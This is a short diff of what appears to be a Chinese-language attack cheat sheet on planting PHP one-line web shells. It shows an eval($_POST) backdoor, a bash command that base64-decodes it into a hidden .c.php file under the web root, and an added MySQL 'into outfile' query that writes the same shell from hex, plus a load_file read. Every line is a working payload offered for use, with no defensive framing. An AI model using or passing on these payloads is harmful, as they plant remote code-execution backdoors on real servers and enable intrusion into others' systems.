@@ -50,3 +50,7 @@ while (True){
 5、bash写一句话
 <?php @eval($_POST["o"]); ?>
 echo PD9waHAgQGV2YWwoJF9QT1NUWyJvIl0pOyA/Pg== | /usr/bin/base64 -d > /var/www/html/test/.c.php
+
+6、mysql写一句话
+select unhex('3C3F70687020406576616C28245F504F53545B226F225D293B203F3E') into outfile '/var/www/html/test/.c.php';
+select load_file('/var/www/html/test/1.php');
